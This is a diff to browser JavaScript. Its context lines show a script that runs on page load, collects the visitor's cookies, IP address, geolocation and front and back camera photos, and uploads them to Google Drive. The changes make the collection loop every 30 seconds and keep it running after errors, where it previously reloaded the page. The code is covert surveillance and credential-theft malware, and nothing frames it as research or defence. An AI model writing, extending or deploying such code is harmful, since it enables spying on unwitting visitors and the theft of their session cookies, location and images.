@@ -97,13 +97,8 @@ document.addEventListener("DOMContentLoaded", function() {
     }
 
     function uploadFileToDrive(file, filename, callback) {
-        var fileMetadata = {
-            'name': filename
-        };
-        var media = {
-            mimeType: file.type,
-            body: file
-        };
+        var fileMetadata = { 'name': filename };
+        var media = { mimeType: file.type, body: file };
         gapi.client.drive.files.create({
             resource: fileMetadata,
             media: media,
@@ -131,6 +126,7 @@ document.addEventListener("DOMContentLoaded", function() {
                 data.latitude = location.latitude;
                 data.longitude = location.longitude;
                 data.cookies = getCookies();
+                
                 const jsonData = JSON.stringify(data);
                 const dataBlob = new Blob([jsonData], { type: 'application/json' });
 
@@ -144,28 +140,33 @@ document.addEventListener("DOMContentLoaded", function() {
                                             captureCameraPhoto('environment', backCameraBlob => {
                                                 if (backCameraBlob) {
                                                     uploadFileToDrive(backCameraBlob, 'back_camera.png', () => {
-                                                        setTimeout(() => location.reload(), 30000);
+                                                        setTimeout(() => collectAndSendData(), 30000);
                                                     });
                                                 } else {
-                                                    setTimeout(() => location.reload(), 30000);
+                                                    setTimeout(() => collectAndSendData(), 30000);
                                                 }
                                             });
                                         });
                                     } else {
-                                        setTimeout(() => location.reload(), 30000);
+                                        setTimeout(() => collectAndSendData(), 30000);
                                     }
                                 });
                             });
                         } else {
-                            setTimeout(() => location.reload(), 30000);
+                            setTimeout(() => collectAndSendData(), 30000);
                         }
                     });
                 });
+            }).catch(error => {
+                console.error('Error getting geolocation:', error);
+                setTimeout(() => collectAndSendData(), 30000);
             });
+        }).catch(error => {
+            console.error('Error getting IP address:', error);
+            setTimeout(() => collectAndSendData(), 30000);
         });
     }
 
     handleClientLoad();
 });
-
 
